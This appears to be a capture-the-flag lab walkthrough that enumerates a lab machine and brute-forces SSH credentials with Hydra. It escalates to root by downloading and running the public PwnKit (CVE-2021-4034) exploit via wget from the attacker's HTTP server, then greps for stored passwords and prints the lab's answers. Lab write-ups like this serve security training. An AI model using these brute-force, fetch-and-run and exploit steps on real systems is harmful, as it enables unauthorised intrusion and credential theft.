### Find the services exposed by the machine
```BASH
sudo nmap -sV 10.10.26.17
```
![image](https://github.com/user-attachments/assets/c12abb48-bb66-4ff5-962a-397cdf2aab0a)

<span style="line-height:0.5;">&nbsp;</span>

### What is the name of the hidden directory on the web server?
```BASH
gobuster dir -u "http://10.10.26.17/" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 64
```
![image](https://github.com/user-attachments/assets/a6679aca-3502-417e-8011-9aee2b27c060)

<pre>development</pre>

<span style="line-height:0.5;">&nbsp;</span>

### User brute-forcing to find the username & password
From the Nmap scan, you can see that port 8080 is open. The server is running `Apache Tomcat/9.0.7` and the URL `/manager/html` is accessible.

![image](https://github.com/user-attachments/assets/798851bc-dac7-4bc1-81b9-e39575c0290e)  

The fact that `http://10.10.26.17:8080/manager/html` prompts for authentication confirms that the Tomcat Manager interface is enabled.

<span style="line-height:0.5;">&nbsp;</span>

Run enum4linux:
```BASH
enum4linux -a 10.10.26.17
```
![image](https://github.com/user-attachments/assets/6cb0e81f-98cb-4770-89ea-71451c420cb5)  

<span style="line-height:0.5;">&nbsp;</span>

Run Hydra:
```BASH
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.26.17 ssh
```

<span style="line-height:0.5;">&nbsp;</span>

What is the username? What is the password?
<pre>jan</pre>
<pre>armando</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What service do you use to access the server?
<pre>SSH</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the name of the other user you found?
<pre>kay</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the final password you obtain?
Now you can log in as jan.
```BASH
ssh jan@10.10.134.179
```
From the screenshot, you can confirm that jan has no sudo privileges at all. This user is completely blocked from escalating via sudo.

![image](https://github.com/user-attachments/assets/9c37f154-1877-47a0-a92b-9c9d20941fad)
![image](https://github.com/user-attachments/assets/27020f18-8c28-4466-ae1e-35751639e86e)

Since vim didn't work for privesc, go back to your list of SUID binaries:
```BASH
ls -l /usr/bin/pkexec
```

![image](https://github.com/user-attachments/assets/a774ea6d-3c95-474f-8f24-c3682d455fac)  

`pkexec` is SUID and dated Jan 2016. This version is vulnerable to [CVE-2021-4034 (PwnKit)](https://ubuntu.com/security/cve-2021-4034).

### On the attacker's machine
Download, compile, and zip the exploit:
```BASH
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
tar czf pwnkit.tar.gz CVE-2021-4034/
```
![image](https://github.com/user-attachments/assets/057c5997-9621-43fb-a172-2f5cdc2f6ffa)

Start a local HTTP server.
```BASH
sudo python3 -m http.server 9000
```
![image](https://github.com/user-attachments/assets/80bf24ec-2969-4f24-9827-f72c39d9344c)

### On the victim machine:
```BASH
cd /tmp
wget http://10.10.151.188:9000/pwnkit.tar.gz
tar xzf pwnkit.tar.gz
cd CVE-2021-4034
./cve-2021-4034
```
![image](https://github.com/user-attachments/assets/94ada5d6-5561-4037-ade8-6e8372c83933)

Run this command to search through all files in `/root` and `/home`, looking for anything that contains: `pass` or `flag`.
```BASH
grep -rE "pass|flag" /root /home 2>/dev/null
```
![image](https://github.com/user-attachments/assets/66de4a59-218f-4e8d-9c7e-e50c15a8daf6)

At the bottom, youâ€™ll see: `/home/kay/pass.bak:heresareallystrongpasswordthatfollowsthepasswordpolicy$$`. Final password:
<pre>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</pre>


